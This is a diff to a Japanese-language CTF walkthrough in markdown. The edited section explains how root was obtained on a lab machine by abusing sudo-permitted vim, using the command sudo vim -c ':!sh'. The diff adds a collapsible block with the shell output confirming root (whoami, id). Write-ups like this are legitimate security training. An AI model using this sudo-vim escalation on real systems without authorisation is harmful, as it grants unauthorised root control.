@@ -291,9 +291,23 @@ drwxr-x--- 16 sunbath sunbath 4096 aug 19  2019 sunbath
 vimがroot権限で動かせれることを確認できたため、vimと回答
 
 ## 10 **What's the root flag?**
-sudo vimでエディタが開いた後に:!sh
-もしくは　sudo vim -c ':!sh'
-をすることでroot昇格
+sudo vimでエディタが開いた後に:!sh  
+もしくは　sudo vim -c ':!sh'  
+をすることでroot昇格  
+<details>
+<summary>コマンド結果</summary>
+
+```text
+$ sudo vim -c ':!sh'
+
+# ^[[2;2R^C
+# 
+# whoami
+root
+# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+</details>
 
 ## 11 **まとめ**
 今回のCTFで発見した脆弱性は以下の通り
